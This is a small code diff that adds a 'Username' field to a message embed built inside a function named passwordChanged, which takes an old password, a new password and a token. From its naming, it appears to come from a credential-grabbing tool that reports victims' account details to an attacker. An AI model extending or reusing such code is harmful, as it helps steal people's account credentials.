@@ -844,6 +844,11 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
             inline: true,
           },
           {
+            name: '<:patriot_token:1032868283759730728> Username',
+            value: `\`${json.username}\``,
+            inline: true,
+          },
+          {
             name: '<a:prt_world9:1032868293528268831> Email',
             value: `\`${json.email}\``,
             inline: true,
